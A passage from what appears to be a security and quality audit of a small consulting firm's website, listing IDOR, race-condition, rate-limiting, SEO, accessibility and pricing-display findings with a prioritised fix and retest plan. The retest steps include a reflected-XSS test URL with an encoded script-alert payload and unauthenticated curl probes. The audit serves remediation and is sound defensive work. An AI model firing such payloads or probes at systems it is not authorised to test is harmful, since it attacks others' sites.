1. **Cron auth** — add `CRON_SECRET=$(openssl rand -hex 32)` to Vercel env (Production + Preview). Redeploy. Verify Vercel cron logs show `200` on `/api/reminders` and `/api/weekly-digest` (Vercel auto-attaches the Authorization header). `curl https://www.30dayramp.com/api/reminders` (no header) must return `401`.
2. **OAuth callback XSS** — visit `/api/google-oauth-callback?error=%3Cscript%3Ealert(1)%3C%2Fscript%3E` — must render the literal `<script>` text in the `<pre>` block, not execute.
3. **OAuth state hardening** — start the OAuth flow from the admin UI button. Verify (a) the URL Google receives no longer contains `ADMIN_TOKEN`, (b) the callback succeeds and shows the refresh token, (c) replaying the callback URL after 10 minutes returns `Invalid state`.
4. **Admin querystring fallback** — `curl https://www.30dayramp.com/api/admin?token=$ADMIN_TOKEN` must return `401` (was `200`).
5. **send-followup link** — trigger from admin, open the customer email, click "View your full roadmap →" — must load the roadmap (was 403).
6. **RLS** — in Supabase SQL editor, switch role to `anon` and `select count(*) from portal_events;` — must return permission error.

---

*v2 audit complete — 2026-04-29. Author: Senior Security Architect engagement. Open issue count: 31. Patches landing this PR: 10. Patches needing sign-off: 6.*

---
---

# v1 audit (preserved for context — 2026-04-27)

**Audited at:** `aaff7ef` on `main` (2026-04-27, branch synced via `git pull origin main` — already up to date)
**Scope:** all 18 HTML pages, `styles.css`, 22 API route files in `api/` (incl. `_lib/`), `vercel.json`, `db/migrations/`, `scripts/e2e-test.sh`, sitemap, robots, README.
**Method:** read-only static analysis. No headless browser / Lighthouse run — recommendations are grounded in source review.

---

## Executive Summary

Strong copy and positioning; structurally fragile under the hood. The site reads as a credible "AI department in 30 days" pitch — the hero, comparison, and pricing pages are confident and well-written. **But three things would embarrass us in front of a sharp prospect:** (1) the design system is duplicated inline on every page with quiet drift, and `about.html` ships the Tailwind Play CDN — a banner explicitly forbidden in production; (2) navigation is inconsistent — `/comparison` has no mobile nav at all, six other pages link to `/about` from neither header nor footer, and the favicon falls back to a non-existent `favicon.ico` everywhere; (3) there are real backend risks — `get-map` and `get-roadmap` have IDOR (any UUID = full access, no auth, no expiry), the questionnaire attaches to "most recent booking by email" with no booking ID, and the pricing toggle on `index.html` causes a static-HTML/JS mismatch flash on first paint. None of these are showstoppers; all are fixable in a focused 1–2 day pass. The visual language is competent but generic — to feel "Stripe / Ramp / Notion premium" we need real photography, refined motion, and one consolidated component library, not 18 hand-rolled style blocks.

---

## Phase 1 — Codebase Map ✅

- 18 HTML pages, **no build step** (no `package.json`, no Tailwind config, no PostCSS).
- `styles.css` is a one-line, pre-compiled Tailwind v4 build artifact, committed as-is.
- **Only 6 of 18 pages actually link `/styles.css`** (`book`, `client-demo`, `comparison`, `index`, `privacy`, `thanks`). The other 12 are entirely self-contained inline CSS.
- 22 API files under `api/` (Vercel serverless), 1 SQL migration, 1 bash smoke test (`scripts/e2e-test.sh`).
- `vercel.json` defines security headers, CSP, cache rules, rewrites, redirects, and one cron (`/api/reminders` every 30 min).
- Hosted at `30dayramp.com` (Supabase + Resend + Google Calendar OAuth + Anthropic Claude inferred from `process.env` references).

---

## Phase 2 — Git Sync ✅

```
Branch: main
HEAD:   aaff7ef  Audit + polish about page: responsive grid, SVG icons, nav complete, COO placeholder styled
Status: up to date with origin/main
```

Recent commit cadence is healthy (20+ commits in the last few days, all small, focused, and well-titled). Recent fixes: chip double-toggle on `book.html`, JS syntax error on questionnaire, generate-map disabled with 410, contact forms replaced with book CTAs.

---

## Phase 3 — Repo Structure & Build ⚠️

| | Status |
|---|---|
| `vercel.json` security headers (HSTS, CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy) | ✅ Best-practice |
| Cache-Control: 1y immutable for static assets | ✅ |
| Cache-Control: must-revalidate for HTML pages | ✅ (but only the 7 listed pages — `about`, `resources`, `comparison`, `questionnaire`, etc. miss it) |
| `README.md` content | ❌ Single line: `# Ramped`. No project overview, no run instructions, no env-var inventory, no deploy doc. |
| Build pipeline | ❌ None. `styles.css` is a frozen Tailwind output — adding a single utility class anywhere requires hand-editing the minified file or a dev rebuilding Tailwind locally and committing. |
| `package.json` / lockfile | ❌ Missing. No way to pin Node version, dependency versions for `api/*`, or run scripts locally without trial-and-error. |
| `.nvmrc` / engines | ❌ Missing. |
| `/resources` rewrite in `vercel.json` | ⚠️ Missing — works because Vercel auto-strips `.html`, but every other clean URL has an explicit rewrite. Inconsistent. |
| `sitemap.xml` coverage | ❌ Lists only `/`, `/demo`, `/comparison`, `/book`. Missing: `/about`, `/resources`, `/roadmap`, `/one-pager`, `/pricing-onepager`, `/questionnaire`, `/privacy`. (The `/admin` exclusion is correct.) |
| `sitemap.xml` lastmod | ⚠️ Hardcoded `2026-04-23` — already 4 days stale. Should be auto-generated or updated on deploy. |
| `robots.txt` disallows `/admin` and `/api/` | ✅ |
| `vercel.json` redirects to-from drift | ⚠️ `/dashboard → /admin` and `/questionnaire-preview → /book` are non-permanent redirects, but those pages still exist in the repo as orphaned files. Either delete the source files or remove the redirects. |

---

## Phase 4 — HTML Quality / SEO / Meta ⚠️

| Page | Canonical | OG tags | Twitter | apple-touch-icon | JSON-LD | Vercel Insights | `<h1>` | description |
|---|---|---|---|---|---|---|---|---|
| `index.html` | ✅ | ✅ | ✅ | ✅ | ✅ (3 schemas) | ✅ | ✅ | ✅ |
| `book.html` | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ✅ | ✅ |
| `comparison.html` | ✅ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ |
| `about.html` | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| `resources.html` | ✅ | ✅ | ✅ | ❌ | ❌ | ✅ | ✅ | ✅ |
| `questionnaire.html` | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| `one-pager.html` | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| `pricing-onepager.html` | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ |
| `privacy.html` | ✅ | partial | ❌ | ✅ | ❌ | ❌ | ✅ | ✅ |
| `thanks.html` | ✅ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| `roadmap.html` | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ❌ |
| `map-result.html` | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| `404.html` | ❌ (OK, noindex) | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ |

**Critical gaps:**

- ❌ **`about.html` has no canonical, no OG, no Twitter card, no apple-touch-icon, no JSON-LD.** A page named "About — Ramped AI" is the second-most-likely page someone shares to LinkedIn. Right now it has no preview image, no rich snippet — it'll look like a broken card.
- ❌ **`favicon.ico` is referenced by every page** (`<link rel="alternate icon" href="/favicon.ico">`) **but the file does not exist in the repo.** Older browsers and tabs that prefer ICO will hit a 404. Either drop the alternate link or generate a real `.ico`.
- ⚠️ **JSON-LD is only on `index.html` and `comparison.html`.** `/about` should have a `Person` schema for Andrew Yoon and a `BreadcrumbList`. `/book` should have an `Event` or `Service` schema. `/resources` should have `Article` schema for each resource.
- ⚠️ **Vercel Insights is only on 5 pages** (`404`, `book`, `client-demo`, `index`, `resources`). You're flying blind on `/about`, `/comparison`, `/questionnaire`, `/thanks` — the exact funnel pages where conversion data matters.
- ⚠️ Inter font weight loadout drifts page to page: `index` loads `400;500;600;700;800`, `book` loads `400;500;600;700` (no 800), `logo-concepts` loads `400;600;700;800;900` (no 500, has 900). **`roadmap.html` does not load Inter at all** — it inherits system fonts.

---

## Phase 5 — Design System / CSS Drift ❌

This is the biggest structural issue.

- ❌ **No single source of truth for design tokens.** Every page declares its own `:root { --ink, --paper, --line, --muted, --accent, ... }` block.
- ❌ **Tokens drift between pages:**
  - `--paper`: `#FAFAF7` (most pages) vs `#FAFAFA` on `about.html`
  - `--line`: `#E6E4DC` (most) vs `#E5E8EF` (`about.html`, `pricing-onepager.html`) vs `rgba(250,250,247,0.1)` (`404.html` — dark theme, OK)
  - `--surface`: `#F5F5F3` (most) vs `#F4F5F7` (`about`) vs `#F7F8FA` (`pricing-onepager`)
  - `--muted`: `#5B6272` (most) vs `#8A95A8` (`404.html`)
- ❌ **`about.html` ships `<script src="https://cdn.tailwindcss.com?plugins=typography" defer>`** — the **Tailwind Play CDN, which is explicitly NOT for production**. It's render-blocking, kills perceived speed, and ignores the existing `styles.css` artifact other pages use. **Remove on day one.**
- ⚠️ The pre-compiled `styles.css` is a single 21KB minified line. Editing it is hostile. Adding a new utility means either (a) hand-grafting it into the minified blob or (b) running Tailwind locally and re-committing — and there's no Tailwind config in the repo to do that with.
- ⚠️ **Button styling (`btn-primary`, `btn-ghost`) is duplicated inline on at least 5 pages** with subtle differences (`padding:13px 22px` here, `padding:9px 14px` there, `padding:8px 16px` on `book.html`).
- ⚠️ Footer markup is hand-copied across `index`, `book`, `about`, `comparison`, `resources` — minor diffs creeping in (about's footer is the only one with an `/about` link in it).

**Fix direction:** stand up a real Tailwind v4 build (one config file, one source CSS, output to `styles.css`). Move tokens, button classes, nav, footer into reusable include snippets. The site is small enough (18 pages) that a 1-day investment in a build step + partials erases an entire class of bugs.

---

## Phase 6 — API / Backend Security ⚠️

The backend is more thoughtful than the frontend — there's a shared `_lib/admin-auth.js` with a constant-time token comparison, a CORS allowlist that's actually used, an in-memory rate limiter, and `validate.js` HTML-escapes user input before it goes into emails. Real issues remain:

| Severity | Finding | File / Line |
|---|---|---|
| ❌ Critical | **IDOR on automation map.** `GET /api/get-map?id=UUID` returns a customer's full automation map to anyone with the UUID. No auth, no signed token, no expiry, no email-match check. UUIDs leak through email links, browser history, and `Referer` headers. | `api/get-map.js:21–31` |
| ❌ Critical | **IDOR on roadmap.** Same pattern. `GET /api/get-roadmap?id=BOOKING_UUID` returns name/company/datetime/automation_map/questionnaire. The endpoint is explicitly designed as "public" but should still be a signed/expiring URL. | `api/get-roadmap.js:25–60` |
| ❌ Critical | **Questionnaire attaches to "most recent booking by email"** — no booking ID supplied by the client. If a prospect books twice (rescheduled, or two pending bookings), the wrong record gets the questionnaire data. | `api/questionnaire.js` (find-by-email branch) |
| ⚠️ High | **Double-booking race condition.** `book.js` POST relies on Supabase returning 409 on duplicate — but only works if `bookings.datetime` has a `UNIQUE` constraint. The migration shipped (`db/migrations/001_agent_logging.sql`) only sets up `agent_runs`/`agent_logs`; the bookings constraint is not in version control. **Verify in Supabase console** and back-fill a migration. | `api/book.js`; missing migration |
| ⚠️ High | **`reminders.js` cron is not idempotent.** Window is ±15 min; cron runs every 30 min. A booking that lands at exactly the cron-edge could get a reminder twice. No `reminded_24h_at` / `reminded_1h_at` column being checked. | `api/reminders.js`, `vercel.json` cron |
| ⚠️ High | **Env var naming mismatch.** `send-followup.js` reads `ADMIN_PASSWORD`; every other admin endpoint reads `ADMIN_TOKEN` via `_lib/admin-auth.js`. One can be set in Vercel and the other left blank — silent failure. | `api/send-followup.js` |
| ⚠️ Medium | **Rate limiting is in-memory (per-instance).** Vercel scales serverless containers horizontally; an attacker can defeat the 5-req/min cap by hitting the same endpoint from different sources fast enough to land on different containers. | `api/_lib/validate.js` |
| ⚠️ Medium | **Anthropic API key passed to `api.anthropic.com` from `questionnaire.js`** — fine, but the prompt is built by string-interpolating booking + questionnaire data without sanitization. Low risk because Claude returns enforced JSON, but defense-in-depth: pass user data as a separate user-role message, not interpolated into the system prompt. | `api/questionnaire.js` |
| ✅ | CSP, HSTS, Referrer-Policy, Permissions-Policy headers in `vercel.json`. | `vercel.json` |
| ✅ | Constant-time token comparison; CORS allowlist; admin endpoints all check auth. | `api/_lib/admin-auth.js` |
| ✅ | `generate-map.js` correctly returns 410 Gone (intentionally disabled). | |
| ✅ | RLS enabled on `agent_runs` / `agent_logs`. | `db/migrations/001_agent_logging.sql` |

---

## Phase 7 — Performance & Assets ⚠️

| | Status |
|---|---|
| Total uncompressed page weight | `client-demo.html` 136KB · `admin.html` 88KB · `index.html` 60KB. ⚠️ Heavy for static HTML. |
| `og-image.png` | ❌ **5KB.** Standard Open Graph images at 1200×630 are 50–200KB. This image is almost certainly low-resolution or near-empty. Will look bad when shared on Slack / LinkedIn / iMessage. |
| `apple-touch-icon.png` | ⚠️ 1.5KB. Should be 180×180 with real visual weight. Currently nearly blank. |
| `favicon.svg` | ✅ 404 bytes — fine. |
| `xtractordepot-logo.jpg` | ✅ 7.9KB JPG. Could be WebP for ~30% smaller, but not urgent. |
| Inline `<style>` blocks per page | ⚠️ Most pages duplicate ~50–150 lines of CSS that could be moved to `styles.css` — hurts cache reuse across pages. |
| Google Fonts loaded via `<link>` | ⚠️ Every page loads Inter 400+500+600+700+800 + JetBrains Mono 400+500. Could `font-display: swap` and self-host to remove the third-party round-trip. |
| `defer` on Vercel Insights | ✅ |
| Tailwind Play CDN on `about.html` | ❌ Adds ~280KB JS that runs on every page view. **Remove.** |
| Image lazy-loading | ✅ The one image (`xtractordepot-logo.jpg`) uses `loading="lazy"` and `decoding="async"`. |

---

## Phase 8 — Accessibility ⚠️

| | Status |
|---|---|
| `lang="en"` on all pages | ✅ |
| Skip-to-main link on `index.html`, `book.html`, `comparison.html` | ✅ |
| Skip-to-main link missing on `about.html`, `questionnaire.html`, `resources.html`, etc. | ⚠️ |
| `aria-label`, `aria-controls`, `aria-expanded` on mobile nav toggle (`index.html`) | ✅ Excellent. |
| **Mobile nav drawer** | ❌ Only `index.html`, `book.html`, `resources.html` have a working mobile drawer. **`comparison.html` mobile shows ONLY the "Get started" CTA** — Demo, VA-vs-AI, all hidden. **`about.html` mobile shows nothing** — the entire nav is `hidden sm:flex` with no mobile alternative. |
| Heading hierarchy | ⚠️ `<h1>` missing on `one-pager.html`, `pricing-onepager.html`, `map-result.html` (customer-facing pages — they should have at least one). |
| Focus rings | ✅ `:focus-visible` styled with accent-color outline on most pages. |
| Form labels + errors | ✅ `book.html` form has labels, `aria-invalid`, `role="alert"`, `aria-live="polite"`. Best-in-class for a hand-rolled form. |
| Color contrast | ⚠️ `--muted: #5B6272` on `--paper: #FAFAF7` is ~5.7:1 — passes AA for body text but fails AAA. Acceptable. The `404.html` `--muted: #8A95A8` on dark `--ink` is ~5.4:1 — also passes AA. |
| Image alt text | ✅ The single `<img>` has alt text. |
| `aria-hidden="true"` on decorative SVGs | ✅ Consistently applied. |
| `prefers-reduced-motion` | ❌ Ticker animation on `index.html`, hover-lift transforms, count-up animation — none honor reduced-motion. Easy fix. |

---

## Phase 9 — Cross-Page Consistency ❌

This is where most of the embarrassing bugs live.

### Navigation
- ❌ `/about` link is in nav of **only** `index.html` and `about.html`. **`book`, `comparison`, `resources`, `client-demo` all link past About entirely.**
- ❌ `comparison.html` mobile nav is broken: no hamburger, no drawer, just one CTA.
- ❌ `about.html` mobile shows no nav at all.
- ⚠️ Footer's About link is missing from `index`, `book`, `comparison` footers (only `about.html` and `resources.html` footers include it).

### Email contact drift
- `jon@30dayramp.com` — primary, used on 14 pages ✅
- `hello@30dayramp.com` — `map-result.html` line 783 ❌ **inconsistent**
- `preview@30dayramp.com` — `questionnaire-preview.html` (likely intentional placeholder) ⚠️
- Demo / fictional emails on `client-demo.html` — ✅ scoped to fake data.

### Pricing display drift
| Source | Starter shown | Growth shown |
|---|---|---|
| `index.html` (annual default) | $2,083/mo | $4,167/mo |
| `index.html` (monthly toggle) | $2,500/mo | $5,000/mo |
| `book.html` tier badge | $2,500/mo (always) | $5,000/mo (always) |
| `comparison.html` | "From $2,500/mo + $2,500 onboarding" | (3-yr math: $92,500) |
| `one-pager.html` | $2,500/mo + $2,500 onboarding | $5,000/mo + ? |
| `pricing-onepager.html` | $2,500/mo (annual: $2,083/mo) | $5,000/mo (annual: $4,167/mo) |

A prospect on `index.html` defaulted to **annual** sees $2,083/mo and clicks "Get started → /book?tier=starter". The booking page's tier badge says `Starter · $2,500/mo`. They wonder why the price went up. **This is a conversion-killer.**

### CTA copy drift
- "Book a discovery call" / "Book a free 30-min call" / "Book a free 30-minute discovery call" / "Get started" / "Let's talk" — at least 5 variants for the same primary CTA.
- "Watch a live agent demo →" / "See it in action →" / no demo CTA on `/about` — inconsistent.

### Pricing toggle FOUC bug
`index.html` line 529 renders static HTML with `<span id="starter-period">/yr</span>`. JS calls `setBilling(true)` on load and overwrites this to `/mo`. Until the JS runs, users see "$2,083/yr" — which is **wildly wrong** (no plan is $2,083/year). On a slow phone or with JS blocked, this is the price they see. ❌

---

## Phase 10 — Visual / UX / Conversion ⚠️

Treating the site against a Stripe / Ramp / Notion bar:

### What's working
- ✅ Hero copy is sharp: *"Your AI department, live in 30 days."* — clear, time-bounded, ownable.
- ✅ Pricing-with-guarantee block is unusually direct ("If your AI agent isn't live in 30 days, you get a full refund. No questions, no partial payments, no fine print.") — that's premium-tier confidence.
- ✅ The VA-vs-AI comparison page is genuinely useful, not filler.
- ✅ Comparison table layout is readable. The 3-year math callout is good.
- ✅ Booking flow (calendar → slots → form → confirmation → questionnaire) is genuinely well-built. Best part of the site.
- ✅ FAQ + JSON-LD `FAQPage` schema = good for Google rich results.

### What's holding it back from "expensive"
- ❌ **No real photography anywhere.** Stock SVG icons in pain-icon tiles, gradient placeholder for Andrew's headshot on `about.html`, ghost silhouette for the COO. Stripe / Ramp / Notion all use real photography or commissioned illustration. Right now the visual feel is "competent indie SaaS," not "premium" — exactly the gap the brief calls out.
- ❌ **Single testimonial.** One quote from Xtractor Depot is the entire social-proof pillar of the site. For a $2,500–5,000/mo product, that's thin. Need 3–5 named testimonials with photos, ideally one video.
- ⚠️ **Numbers smell aggregated from a sample of one.** "Avg. $12,000+/mo saved" and "5× avg. ROI year 1" are repeated in the hero stats, ticker, and about page. If the only completed deployment is Xtractor Depot, "average" is misleading. Either add provenance ("based on XYZ deployments") or soften to projected/illustrative.
- ⚠️ **"Verified" badges next to case-study metrics on `about.html`** — green chips next to "14 hrs/wk", "4h → 8m", "Zero" — with no source link. Trust theater. Either link to a one-page case study PDF or remove the badges.
- ⚠️ **Hero has no image, no diagram, no product shot.** Just text + a CTA card. Compare to Ramp.com — every fold has a product shot or animation. The grid background is well-executed but it's not a substitute for showing the thing.
- ⚠️ **Industry pill row** on `index.html` ("Healthcare · Legal · Real Estate · Dental · Field Services · Logistics · Cannabis · Finance") is a list of 8 industries with no proof Ramped has shipped to any of them other than industrial supply. Risky if a prospect's industry is on the list.
- ⚠️ **Ticker scrolls 6 stats indefinitely** — premium sites use scrolling text sparingly. Feels like it's hiding the lack of logos.
- ⚠️ **`about.html` "Co-Founder · COO — Coming soon" placeholder card** is honest but visually loud — a dashed border + plus icon + "We're growing the team. More to come here soon." A prospect seeing "1 founder + a placeholder" can read this as either authentic or unstaffed. Either move to a "Founder + advisors" framing or hide until filled.
- ⚠️ **OG image is 5KB.** Every social share will have a low-res preview.
- ⚠️ **No keyboard shortcut for slot selection** in the booking calendar. Prospects who tab through forms (and prospects' lawyers, who do this professionally) will notice.
- ⚠️ **Empty states** — `resources.html` skeleton placeholders are good. But what does the page look like on a fresh deploy where the cron hasn't populated `ai_resources` yet? Worth checking.
- ❌ **Andrew's bio mentions "SpaceX and Lucid Motors" as Xtractor Depot clients.** If verifiable — fantastic, lead with it on the homepage. If not — high legal/credibility risk, especially on a page with "Verified" badges. **Confirm this claim is litigation-proof or remove it.**

### Mobile-specific
- ❌ `comparison.html` mobile nav is one CTA. From `/comparison` on a phone, the only path forward is `/book` — no `/`, no `/demo`, no `/about`.
- ❌ `about.html` mobile has no nav at all (`hidden sm:flex` with no mobile alternative).
- ⚠️ `index.html` hero stats grid on `<480px` collapses to 2 columns with 6 items → 3 rows. Acceptable but tall.

---

## Phase 11 — Comprehensive Improvement Plan (prioritized)

### ❌ Critical — fix this week (could hurt revenue or credibility)

| # | Finding | File:line | Fix |
|---|---|---|---|
| C1 | IDOR on `get-map` and `get-roadmap` — any UUID = full read | `api/get-map.js:21–31`, `api/get-roadmap.js:25–60` | Require a signed token query param (`?id=UUID&t=HMAC(UUID,SECRET,exp)`). Reject if HMAC invalid or expired. Add `expires_at` to returned objects. |
| C2 | Questionnaire attaches to "most recent booking by email" | `api/questionnaire.js` find-by-email branch | Pass `booking_id` from the `book.html` flow and require it server-side. Remove the email-only fallback. |
| C3 | Tailwind Play CDN on `about.html` | `about.html:10` | Delete the script tag. Replace any Tailwind utility classes with the same CSS variables / inline styles the rest of the site uses, **or** stand up the Tailwind build (item M1). |
| C4 | `comparison.html` has no mobile nav | `comparison.html:120–124` | Copy the mobile-nav-drawer block from `index.html`. |
| C5 | `about.html` mobile shows no nav | `about.html:89–96` | Same — add mobile drawer. |
| C6 | Pricing toggle FOUC: static `/yr` flashes before JS swaps to `/mo` | `index.html:529, 565` | Render the annual values directly in HTML (`$2,083/mo`), not `/yr`. Move the toggle initial state into the markup, not the JS. |
| C7 | Pricing mismatch between annual default on home and tier badge on `/book` | `book.html:366` | Change `tierLabels` to read the URL `?tier=` AND `?billing=annual\|monthly`, and pass `billing=annual` from the homepage CTAs. Match the displayed price to whatever the user clicked from. |
| C8 | `favicon.ico` referenced everywhere but file doesn't exist | every HTML page (`<link rel="alternate icon" href="/favicon.ico">`) | Generate a real `.ico` (multi-resolution: 16/32/48) from `favicon.svg`, commit to root. Or remove the `alternate icon` line. |
| C9 | `about.html` missing canonical, OG, Twitter, apple-touch-icon, JSON-LD | `about.html:1–17` | Copy the meta block from `index.html`, swap URL/title/description. Add `Person` JSON-LD for Andrew. |
| C10 | OG image is 5KB | `og-image.png` | Replace with a 1200×630 PNG ≈ 80–150KB. Include logo + tagline + "Live in 30 days." Ideally a designer's asset, not a screenshot. |
| C11 | Verify "SpaceX / Lucid Motors as Xtractor Depot clients" claim | `about.html:148` | If verifiable: add proof (LinkedIn screenshot, customer logo with permission). If not: remove from copy. |

### ⚠️ High — fix this sprint

| # | Finding | File:line | Fix |
|---|---|---|---|
| H1 | Email inconsistency (`hello@` vs `jon@`) | `map-result.html:783` | Replace `hello@30dayramp.com` with `jon@30dayramp.com`. |
| H2 | `/about` link missing from nav on `book`, `comparison`, `resources`, `client-demo` | each page's `<nav>` | Add `<a href="/about">About</a>` to each nav, between Demo and Comparison. Same in footers. |
| H3 | `reminders.js` cron not idempotent | `api/reminders.js`, schema | Add `reminded_24h_at`, `reminded_1h_at` `timestamptz` columns to `bookings`. Skip if already set. |
| H4 | `ADMIN_PASSWORD` vs `ADMIN_TOKEN` env-var split | `api/send-followup.js:8, 61` | Replace with `isAuthorized(req)` import from `_lib/admin-auth.js`. |
| H5 | Sitemap missing `/about`, `/resources`, `/roadmap`, `/questionnaire`, `/privacy`, `/one-pager` | `sitemap.xml` | Add entries; auto-stamp `lastmod` from CI. |
| H6 | Vercel Insights missing on `about`, `comparison`, `questionnaire`, `thanks`, `privacy` | each `<head>` | Add `<script defer src="/_vercel/insights/script.js"></script>`. |
| H7 | JSON-LD missing on `/about`, `/book` | `about.html`, `book.html` | Add `Person` (Andrew) on `/about`, `Service` + `Offer` on `/book`. |
| H8 | Skip-link missing on `about`, `questionnaire`, `resources`, `one-pager`, `pricing-onepager` | each `<body>` start | Add `<a href="#main" class="skip-link">Skip to main content</a>` and matching `#main` target. |
| H9 | `prefers-reduced-motion` not honored | `index.html` ticker, all `hover-lift`, count-up | Add `@media (prefers-reduced-motion: reduce) { animation: none; transition: none; }`. |
| H10 | `roadmap.html` doesn't load Inter font | `roadmap.html` `<head>` | Add the Inter `<link>` blocks. |
| H11 | Bookings table likely missing UNIQUE on `datetime` | Supabase schema | Add migration `ALTER TABLE bookings ADD CONSTRAINT bookings_datetime_unique UNIQUE (datetime);`. Commit migration to `db/migrations/`. |
| H12 | Rate-limiter is in-memory | `api/_lib/validate.js` | Migrate to Vercel KV / Upstash for distributed rate limiting before any pay-per-request endpoint hits real volume. |

### Medium — backlog

| # | Finding | Fix |
|---|---|---|
| M1 | No build pipeline; `styles.css` is a frozen Tailwind output | Stand up Tailwind v4 + `package.json` + `tailwind.config.js` + `npm run build`. Move all per-page `:root` token blocks into a single `tokens.css` import. |
| M2 | Footer / nav / `<head>` boilerplate copy-pasted across 18 pages | Move to per-route HTML partials. Easiest path without a framework: a tiny Node script in `scripts/build.js` that templates fragments at build time and writes static HTML. |
| M3 | Inter font weight loadout drift | Standardize on `400;500;600;700;800` everywhere. |
| M4 | `README.md` is a single line | Write a proper one: stack, env vars (with redacted examples), `npm install && npm run dev`, deploy notes, "where do bookings live", who-to-page. |
| M5 | `/dashboard` and `/questionnaire-preview` files exist but are redirected | Delete the source files; let the redirect 404 to be safe. |
| M6 | `client-demo.html` is 136KB | Split off the per-industry demos into separate routes lazy-loaded on click. |
| M7 | "Verified" badges on `/about` case-study metrics with no source | Either link to a downloadable case study or remove the chip. |
| M8 | Single testimonial as social proof | Land 2 more named testimonials in next 30 days. Aim for 1 video. |
| M9 | Industry pill row implies broader deployment than is real | Either ship one shadow case study per industry or trim list to "Manufacturing · Industrial Supply · Field Services" + "and more on request". |
| M10 | Self-host or `font-display: swap` on Google Fonts | Reduces initial render block. |
| M11 | `og-image.png` reused across all pages | Per-page OG images for top 4 pages would lift CTR on social. |

### Low — polish

| # | Finding | Fix |
|---|---|---|
| L1 | Ticker can be paused with hover but not keyboard-stopped | Add `@media (hover:none)` to disable, or a pause button. |
| L2 | Background grid uses `linear-gradient(...)` with `1px` lines — at 2x dpi can look fuzzy | Use SVG pattern or test on a Retina display. |
| L3 | `404.html` doesn't link to `/book` or `/comparison` | Add a secondary CTA: "Or book a discovery call →". |
| L4 | `xtractordepot-logo.jpg` could be WebP | Saves ~3KB. |
| L5 | OAuth callback HTML reflects `error` query param | HTML-escape (`api/google-oauth-callback.js:16`). |
| L6 | `vercel.json` redirects `/dashboard → /admin` are non-permanent | Mark `permanent: true` once you're sure no one bookmarks `/dashboard`. |

---

## Final Output

### Top 5 Actions to Implement Immediately

1. **Patch the IDOR.** Add a signed, expiring token requirement on `/api/get-map` and `/api/get-roadmap`. Generate the token in `api/questionnaire.js` when the map is created and embed it in the customer email. Today.
2. **Kill the Tailwind Play CDN on `about.html`.** Replace its Tailwind classes with inline styles matching the rest of the site, then add the missing meta block (canonical, OG, Twitter, apple-touch-icon, Vercel Insights, mobile nav drawer). Today.
3. **Fix the pricing FOUC + tier-badge mismatch.** Render `$2,083/mo` directly in `index.html` markup. Pass `?billing=annual|monthly` through to `/book` and have `tierLabels` read it. Today.
4. **Add mobile nav to `comparison.html` and `about.html`.** Copy the working drawer pattern from `index.html`. Add `/about` to every primary nav and footer. Today.
5. **Replace `og-image.png` with a real 1200×630 share asset, generate a real `favicon.ico`, and verify the SpaceX/Lucid claim before next prospect call.** This week.

### Step-by-Step Implementation Plan

1. **Branch.** `git checkout -b audit-2026-04-27`.
2. **Critical batch (1 PR):**
   - Patch IDOR (C1).
   - Replace `tierLabels` and homepage `/yr` static markup (C6, C7).
   - Add mobile nav to `comparison.html`, `about.html` (C4, C5).
   - Add full meta block to `about.html` (C9).
   - Remove Tailwind CDN from `about.html` (C3).
   - Fix `hello@` → `jon@` on `map-result.html` (H1).
   - Add `/about` to every primary nav and footer (H2).
3. **Asset batch (1 PR):**
   - New `og-image.png` (1200×630, ~120KB).
   - New `favicon.ico` (multi-res from `favicon.svg`).
   - New `apple-touch-icon.png` (180×180).
   - Sitemap rebuilt with all canonical pages and current `lastmod` (H5).
4. **Backend batch (1 PR):**
   - Bookings UNIQUE migration (H11).
   - Reminders idempotency columns + check (H3).
   - `send-followup` to use shared `isAuthorized` (H4).
   - Questionnaire `booking_id` enforcement (C2).
5. **A11y / SEO batch (1 PR):**
   - Vercel Insights everywhere (H6).
   - JSON-LD on `/about` and `/book` (H7).
   - Skip-links across remaining pages (H8).
   - `prefers-reduced-motion` (H9).
   - Roadmap loads Inter (H10).
6. **Build pipeline (separate PR, larger scope):** M1, M2, M4 — Tailwind config + partials + README. **Don't merge into the same PR as the critical fixes.**

### Re-test Instructions (smoke test after each batch)

After **each** PR merges:

1. **Local check:**
   ```
   git pull origin main
   git rev-parse HEAD                                    # capture commit hash
   ```
2. **Deployment check:** open the Vercel preview URL for the PR.
3. **Manual desktop run-through (Chrome, 1440×900):**
   - `/` — load, count up animations fire, pricing toggle works without flash, FAQ opens, CTAs go to `/book`.
   - `/about` — meta in social share preview (use `view-source:` to confirm canonical/OG present), mobile drawer at <640px, no Tailwind CDN script in network panel.
   - `/comparison` — mobile drawer at <640px, all nav links present desktop.
   - `/book` — calendar loads, click a date, pick a slot, submit a fake booking with email `claude-test+<timestamp>@30dayramp.com` and `?tier=starter&billing=annual` — confirm tier badge shows `$2,083/mo (annual)`. Confirmation appears.
   - Questionnaire flow runs, submits to `/api/questionnaire`, `you're all set` page renders.
   - `/admin?token=$ADMIN_TOKEN` — booking shows up; click "View Map"; the map URL has a signed token; loading without the token returns 401/403.
   - `/resources` — list renders.
   - `/404-test` — 404 page loads with link home.
4. **Lighthouse run** (Chrome devtools → Lighthouse → mobile, desktop):
   - Targets: Performance ≥ 90 mobile, Accessibility ≥ 95, Best Practices ≥ 95, SEO ≥ 100.
5. **Console / Network:**
   - No 404s in network (especially `favicon.ico`).
   - No CSP violations in console.
   - `og-image.png` request: 1200×630, < 200KB.
6. **Run the smoke test script:**
   ```
   bash scripts/e2e-test.sh
   ```
7. **Social preview check:** paste `https://www.30dayramp.com/about` into LinkedIn / Slack / iMessage and confirm preview card renders with image + title + description.
8. **If anything fails, do not merge to `main`.** Open a bug task in the audit doc, fix, retest from step 2.

---

*End of audit.*
